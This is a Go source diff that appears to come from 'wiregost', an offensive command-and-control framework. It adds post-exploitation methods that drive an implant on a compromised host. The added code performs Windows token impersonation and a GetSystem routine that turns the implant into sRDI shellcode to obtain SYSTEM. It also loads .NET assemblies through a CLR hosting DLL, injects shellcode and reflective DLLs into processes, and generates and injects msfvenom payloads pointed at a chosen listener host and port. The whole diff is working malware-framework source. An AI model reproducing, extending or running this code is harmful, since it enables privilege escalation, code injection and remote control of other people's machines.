@@ -24,14 +24,18 @@ import (
 	"os"
 	"path"
 	"path/filepath"
+	"strings"
 	"time"
 
 	"github.com/evilsocket/islazy/tui"
 	"github.com/gogo/protobuf/proto"
+
 	clientpb "github.com/maxlandon/wiregost/protobuf/client"
 	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
+	"github.com/maxlandon/wiregost/server/assets"
 	"github.com/maxlandon/wiregost/server/core"
 	"github.com/maxlandon/wiregost/server/generate"
+	"github.com/maxlandon/wiregost/server/msf"
 	"github.com/maxlandon/wiregost/util"
 )
 
@@ -50,8 +54,8 @@ func NewPost() *Post {
 // They are identical to the commands available in the console for using sessions
 // - Filesystem
 // - Info
-// - Priv
 // - Proc
+// - Priv
 // - Execute
 
 // GetSession - Returns the Session corresponding to the Post "Session" option, or nothing if not found.
@@ -253,36 +257,6 @@ func (m *Post) ListDirectory(path string, timeout time.Duration) (result string,
 	return fmt.Sprintf("directory: %s", dirList), nil
 }
 
-// Execute - Execute a program on the session's target.
-// @path    => path to the program to run
-// @args    => optional list of arguments to run with the program (if none, use []string{})
-// @timeout => Desired timeout for the session command
-func (m *Post) Execute(path string, args []string, timeout time.Duration) (result string, err error) {
-	err = m.GetSession()
-	if err != nil {
-		return "", errors.New("Error finding ghost Session when uploading")
-	}
-	sess := m.Session
-
-	data, _ := proto.Marshal(&ghostpb.ExecuteReq{
-		Path:   path,
-		Args:   args,
-		Output: true,
-	})
-	data, err = sess.Request(ghostpb.MsgExecuteReq, timeout, data)
-	if err != nil {
-		return "", err
-	}
-	resp := ghostpb.Execute{}
-	err = proto.Unmarshal(data, &resp)
-	if err != nil {
-		return "", err
-	}
-
-	res := fmt.Sprintf("Results:\n %s", resp.Result)
-	return res, nil
-}
-
 // -----------------------------------------------------------------------------------------------------------//
 // [ PROC METHODS ]
 // -----------------------------------------------------------------------------------------------------------//
@@ -381,6 +355,12 @@ func (m *Post) Migrate(pid int, timeout time.Duration) (result string, err error
 	if err != nil {
 		return "", err
 	}
+
+	migReq := &ghostpb.Migrate{}
+	err = proto.Unmarshal(data, migReq)
+	if migReq.Err != "" {
+		return "", errors.New(migReq.Err)
+	}
 	m.Event(tui.Green("Done"))
 
 	return "", nil
@@ -442,4 +422,361 @@ func (m *Post) ProcDump(pid int, timeout time.Duration) (tmp string, err error) 
 	m.Event(fmt.Sprintf("Process dump stored in %s\n", f.Name()))
 
 	return f.Name(), nil
+}
+
+// -----------------------------------------------------------------------------------------------------------//
+// [ PRIV METHODS ]
+// -----------------------------------------------------------------------------------------------------------//
+
+// RunAs - (WINDOWS ONLY) Run a program located at @path, as user @username.
+// @username - User to impersonate
+// @process - Path to process to run
+// @args - Optional list of arguments to run with the process
+func (m *Post) RunAs(username, process string, args []string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+
+	data, _ := proto.Marshal(&ghostpb.RunAsReq{
+		Username: username,
+		Process:  process,
+		Args:     strings.Join(args, " "),
+		GhostID:  m.Session.ID,
+	})
+
+	m.Event(fmt.Sprintf("Runinng %s as '%s'", process, username))
+	data, err = m.Session.Request(ghostpb.MsgRunAs, timeout, data)
+	if err != nil {
+		return "", nil
+	}
+	runAs := &ghostpb.RunAs{}
+	err = proto.Unmarshal(data, runAs)
+	if runAs.Err != "" {
+		return "", errors.New(runAs.Err)
+	}
+	m.Event(runAs.Output)
+
+	return "", nil
+}
+
+// Impersonate - (WINDOWS ONLY) Impersonate a user on the target.
+// @username - User to impersonate
+func (m *Post) Impersonate(username string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+
+	data, _ := proto.Marshal(&ghostpb.ImpersonateReq{
+		Username: username,
+	})
+	m.Event(fmt.Sprintf("Impersonating user '%s'", username))
+	data, err = m.Session.Request(ghostpb.MsgImpersonateReq, timeout, data)
+
+	resp := &ghostpb.Impersonate{}
+	err = proto.Unmarshal(data, resp)
+	if resp.Err != "" {
+		return "", errors.New(resp.Err)
+	}
+
+	return "", nil
+}
+
+// Rev2Self - Revert back from impersonation.
+func (m *Post) Rev2Self(timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+
+	m.Event("Reverting from user impersonation...")
+	data, _ := proto.Marshal(&ghostpb.RevToSelfReq{})
+	data, err = m.Session.Request(ghostpb.MsgRevToSelf, timeout, data)
+
+	resp := &ghostpb.RevToSelf{}
+	err = proto.Unmarshal(data, resp)
+	if resp.Err != "" {
+		return "", errors.New(resp.Err)
+	}
+
+	return "", nil
+}
+
+// GetSystem - (WINDOWS ONLY) Run process located at @process, in order to get NT AUTHORITY\SYSTEM,
+func (m *Post) GetSystem(process string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+
+	conf := getSessionGhostConfig(m.Session)
+	config := generate.GhostConfigFromProtobuf(conf)
+	config.Format = clientpb.GhostConfig_SHARED_LIB
+	config.ObfuscateSymbols = false
+	dllPath, err := generate.GhostSharedLibrary(config)
+	if err != nil {
+		return "", err
+	}
+	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
+	if err != nil {
+		return "", err
+	}
+	data, _ := proto.Marshal(&ghostpb.GetSystemReq{
+		Data:           shellcode,
+		HostingProcess: process,
+	})
+
+	m.Event("Attempting to create a new Ghost implant session as 'NT AUTHORITY\\SYSTEM'...")
+	data, err = m.Session.Request(ghostpb.MsgGetSystemReq, timeout, data)
+
+	gsResp := &ghostpb.GetSystem{}
+	err = proto.Unmarshal(data, gsResp)
+	if err != nil {
+		return "", err
+	}
+
+	return gsResp.Output, nil
+}
+
+// -----------------------------------------------------------------------------------------------------------//
+// [ EXECUTE METHODS ]
+// -----------------------------------------------------------------------------------------------------------//
+
+// Execute - Execute a program on the session's target.
+// @path    => path to the program to run
+// @args    => optional list of arguments to run with the program (if none, use []string{})
+// @timeout => Desired timeout for the session command
+func (m *Post) Execute(path string, args []string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when uploading")
+	}
+	sess := m.Session
+
+	data, _ := proto.Marshal(&ghostpb.ExecuteReq{
+		Path:   path,
+		Args:   args,
+		Output: true,
+	})
+	data, err = sess.Request(ghostpb.MsgExecuteReq, timeout, data)
+	if err != nil {
+		return "", err
+	}
+
+	resp := ghostpb.Execute{}
+	err = proto.Unmarshal(data, &resp)
+	if err != nil {
+		return "", err
+	}
+	if resp.Error != "" {
+		return "", errors.New(resp.Error)
+	}
+
+	res := fmt.Sprintf("Results:\n %s", resp.Result)
+	return res, nil
+}
+
+// ExecuteAssembly - Execute a DLL assembly located at @path into a child process, with optional arguments.
+func (m *Post) ExecuteAssembly(dll, process string, args []string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+
+	assemblyBytes, err := ioutil.ReadFile(dll)
+	if err != nil {
+		return "", fmt.Errorf("Error reading DLL file: %s", err.Error())
+	}
+
+	hostingDllPath := assets.GetDataDir() + "/HostingCLRx64.dll"
+	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
+	if err != nil {
+		return "", fmt.Errorf("Could not find hosting dll in %s", assets.GetDataDir())
+	}
+	data, _ := proto.Marshal(&ghostpb.ExecuteAssemblyReq{
+		Assembly:   assemblyBytes,
+		HostingDll: hostingDllBytes,
+		Arguments:  strings.Join(args, " "),
+		Process:    process,
+		Timeout:    int32(timeout),
+		GhostID:    m.Session.ID,
+	})
+
+	m.Event(fmt.Sprintf("Sending execute assembly request to ghost %d\n", m.Session.ID))
+	data, err = m.Session.Request(ghostpb.MsgExecuteAssemblyReq, timeout, data)
+	if err != nil {
+		return "", err
+	}
+
+	execResp := &ghostpb.ExecuteAssembly{}
+	proto.Unmarshal(data, execResp)
+	if execResp.Error != "" {
+		return "", errors.New(execResp.Error)
+	}
+	m.Event(fmt.Sprintf("Assembly output:\n%s", execResp.Output))
+
+	return "", nil
+}
+
+// ExecuteShellcode - Load and execute a shellcode in a process.
+func (m *Post) ExecuteShellcode(shellcodePath string, pid int, rwxPages bool, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+
+	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
+	if err != nil {
+		return "", fmt.Errorf("Error: %s\n", err.Error())
+	}
+
+	data, _ := proto.Marshal(&clientpb.TaskReq{
+		Data:     shellcodeBin,
+		RwxPages: rwxPages,
+		Pid:      uint32(pid),
+	})
+
+	m.Event(fmt.Sprintf("Sending shellcode to %s ...", m.Session.Name))
+	data, err = m.Session.Request(ghostpb.MsgTask, timeout, data)
+	if err != nil {
+		return "", err
+	}
+
+	resp := &ghostpb.Envelope{}
+	err = proto.Unmarshal(data, resp)
+
+	if resp.Err != "" {
+		return "", errors.New(resp.Err)
+	}
+
+	return "", nil
+}
+
+// SideloadDLL - Load a DLL into a process.
+func (m *Post) SideloadDLL(dll, entryPoint, process string, args []string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+
+	binData, err := ioutil.ReadFile(dll)
+	if err != nil {
+		return "", err
+	}
+	shellcode, err := generate.ShellcodeRDIFromBytes(binData, entryPoint, strings.Join(args, " "))
+	if err != nil {
+		return "", err
+	}
+
+	data, _ := proto.Marshal(&clientpb.SideloadReq{
+		Data:     shellcode,
+		ProcName: process,
+		GhostID:  m.Session.ID,
+	})
+
+	m.Event(fmt.Sprintf("Sideloading %s ...", dll))
+	data, err = m.Session.Request(ghostpb.MsgSideloadReq, timeout, data)
+	if err != nil {
+		return "", err
+	}
+
+	execResp := &ghostpb.Sideload{}
+	proto.Unmarshal(data, execResp)
+	if execResp.Error != "" {
+		return "", err
+	}
+	if len(execResp.Result) > 0 {
+		m.Event(fmt.Sprintf("Output:\n%s", execResp.Result))
+	}
+	return "", nil
+}
+
+// SpawnDLL - Load and execute a Reflective DLL into a process.
+func (m *Post) SpawnDLL(dll, export, process string, args []string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+
+	offset, err := getExportOffset(dll, export)
+	if err != nil {
+		return "", err
+	}
+
+	binData, err := ioutil.ReadFile(dll)
+	if err != nil {
+		return "", nil
+	}
+	data, _ := proto.Marshal(&ghostpb.SpawnDllReq{
+		Data:     binData,
+		Args:     strings.Join(args, " "),
+		ProcName: process,
+		Offset:   offset,
+		GhostID:  m.Session.ID,
+	})
+
+	m.Event(fmt.Sprintf("Executing reflective dll %s", dll))
+	data, err = m.Session.Request(ghostpb.MsgSpawnDllReq, timeout, data)
+	if err != nil {
+		return "", err
+	}
+
+	execResp := &ghostpb.SpawnDll{}
+	proto.Unmarshal(data, execResp)
+	if execResp.Error != "" {
+		return "", errors.New(execResp.Error)
+	}
+	if len(execResp.Result) > 0 {
+		m.Event(fmt.Sprintf("Output:\n%s", execResp.Result))
+	}
+
+	return "", nil
+}
+
+// InjectMSFPayload - Generate, load and execute a MSF payload into a process, given its PID.
+func (m *Post) InjectMSFPayload(payload, lhost string, lport int, pid int, encoder string, iters int, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+
+	config := msf.VenomConfig{
+		Os:         m.Session.OS,
+		Arch:       msf.Arch(m.Session.Arch),
+		Payload:    payload,
+		LHost:      lhost,
+		LPort:      uint16(lport),
+		Encoder:    encoder,
+		Iterations: iters,
+		Format:     "raw",
+	}
+	rawPayload, err := msf.VenomPayload(config)
+	if err != nil {
+		return "", fmt.Errorf("Error while generating msf payload: %v\n", err)
+
+	}
+	data, _ := proto.Marshal(&ghostpb.RemoteTask{
+		Pid:      uint32(pid),
+		Encoder:  "raw",
+		Data:     rawPayload,
+		RWXPages: true,
+	})
+
+	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
+		payload, m.Session.OS, m.Session.Arch, lhost, lport)
+	m.Event(msg)
+	data, err = m.Session.Request(ghostpb.MsgRemoteTask, timeout, data)
+	if err != nil {
+		return "", err
+	}
+
+	resp := &ghostpb.Envelope{}
+	err = proto.Unmarshal(data, resp)
+	if resp.Err != "" {
+		return "", errors.New(resp.Err)
+	}
+
+	m.Event("Executed payload on target")
+	return "", nil
 }
